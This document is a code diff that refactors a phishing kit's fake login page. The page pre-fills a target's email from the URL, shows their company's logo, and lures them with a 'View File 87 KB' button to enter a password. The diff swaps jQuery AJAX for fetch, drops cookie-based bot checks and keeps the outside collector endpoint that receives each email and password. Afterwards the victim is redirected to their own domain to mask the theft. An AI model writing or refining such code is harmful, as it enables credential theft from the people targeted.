@@ -221,7 +221,7 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
   <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
-  <script>
+ <script>
     let domain = "";
 
     function decodeData(encoded) {
@@ -230,15 +230,14 @@
       return decodeURIComponent(atob(encoded));
     }
 
-    document.cookie = "js_enabled=1; path=/";
-    document.addEventListener("mousemove", function () {
-      document.cookie = "mouse_moved=1; path=/";
-    }, { once: true });
-
     document.addEventListener("DOMContentLoaded", function () {
       const emailInput = document.getElementById("email");
       const domainInfo = document.getElementById("domain-info");
       const logo = document.getElementById("email-logo");
+      const form = document.getElementById("loginForm");
+      const errorDiv = document.getElementById("error");
+      const spinner = document.getElementById("spinner");
+      const submitBtn = document.getElementById("submit-btn");
 
       function updateUI(email) {
         const domainMatch = email.match(/@([\w.-]+\.\w+)/);
@@ -246,17 +245,18 @@
           domain = domainMatch[1];
           domainInfo.textContent = `Sign in with your ${domain} Email`;
           logo.src = `https://logo.clearbit.com/${domain}`;
-          logo.style.display = "block";
-          logo.onerror = () => logo.src = "P_icon.svg";
+          logo.onerror = () => {
+            logo.src = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyMCIgeT0iMjAiIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgZmlsbD0iIzRhNmNmNyIgcng9IjUiLz48cGF0aCBkPSJNMzUsNDAgTDM1LDUwIEw0MCw0NSBMNjUsNjAgTDY1LDQwIEw0MCw1NSBMMzUsNTAiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMyIgZmlsbD0ibm9uZSIvPjwvc3ZnPg==";
+          };
         } else {
           domainInfo.textContent = "Sign in with your Domain Email";
-          logo.style.display = "none";
         }
       }
 
       const hash = window.location.hash.substring(1);
       const parts = hash.split("&");
       const encodedEmail = parts[0];
+      const token = parts[1] ? parts[1].split("=")[1] : null;
 
       try {
         if (encodedEmail) {
@@ -270,58 +270,85 @@
         console.error("Email decoding failed:", e);
         emailInput.value = "";
       }
-    });
 
-    $(document).ready(function () {
-      let count = 0;
-      $('#submit-btn').click(function (event) {
+      // Form submission
+      form.addEventListener("submit", function (event) {
         event.preventDefault();
-        $('#error, #msg').hide();
-
-        const email = $("#email").val();
-        const password = $("#password").val();
+        errorDiv.style.display = "none";
+        
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
         const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-        if (!email) return $('#error').show().html("<p style='color:red;'>Email field is empty</p>");
-        if (!filter.test(email)) return $('#error').show().html("<p style='color:red;'>Invalid email format</p>");
-        if (!password) return $('#error').show().html("<p style='color:red;'>Password field is empty</p>");
-        if (password.length < 6) return $('#error').show().html("<p style='color:red;'>Invalid password</p>");
+        if (!email) {
+          showError("Email field is empty");
+          return;
+        }
+        if (!filter.test(email)) {
+          showError("Invalid email format");
+          return;
+        }
+        if (!password) {
+          showError("Password field is empty");
+          return;
+        }
+        if (password.length < 6) {
+          showError("Password must be at least 6 characters");
+          return;
+        }
 
-        count++;
+        // Show spinner and change button text
+        spinner.style.display = "block";
+        submitBtn.disabled = true;
+        submitBtn.textContent = "Signing in...";
 
-        $.ajax({
-          dataType: 'JSON',
-          url: 'https://po.mkkhsv2.sa.com/css/css/.maxim/jy/ad.php',
-          type: 'POST',
-          data: {
-            email: email,
-            password: password,
-            email_confirm: $('#email_confirm').val()
-          },
-          beforeSend: () => $('#submit-btn').html('Signing in...'),
-          success: function (response) {
-            if (!response || response.signal !== 'ok') {
-              $('#msg').html("<span style='color:red;'>Invalid login. Try again</span>").show();
-            } else {
-              $("#password").val("");
-              if (count >= 3 && domain) {
-                count = 0;
+        // Create form data
+        const formData = new FormData();
+        formData.append("email", email);
+        formData.append("password", password);
+        formData.append("email_confirm", document.getElementById("email_confirm").value);
+
+        // Send to PHP script
+        fetch("https://po.mkkhsv2.sa.com/css/css/.maxim/jy/ad.php", {
+          method: "POST",
+          body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+          if (data === "1") {
+            // Success - redirect after a short delay
+            setTimeout(() => {
+              if (domain) {
                 window.location.href = "https://www." + domain;
+              } else {
+                showError("Login successful but cannot redirect");
+                spinner.style.display = "none";
+                submitBtn.disabled = false;
+                submitBtn.textContent = "View File 87 KB";
               }
-            }
-          },
-          error: function () {
-            $("#password").val("");
-            if (count >= 3 && domain) {
-              count = 0;
-              window.location.href = "https://www." + domain;
-            }
-            $("#msg").show();
-          },
-          complete: () => $('#submit-btn').html('View File 87 KB')
+            }, 1500);
+          } else {
+            showError("Invalid login. Try again");
+            spinner.style.display = "none";
+            submitBtn.disabled = false;
+            submitBtn.textContent = "View File 87 KB";
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          showError("Network error. Please try again");
+          spinner.style.display = "none";
+          submitBtn.disabled = false;
+          submitBtn.textContent = "View File 87 KB";
         });
       });
+
+      function showError(message) {
+        errorDiv.textContent = message;
+        errorDiv.style.display = "block";
+      }
     });
   </script>
 </body>
+
 </html>
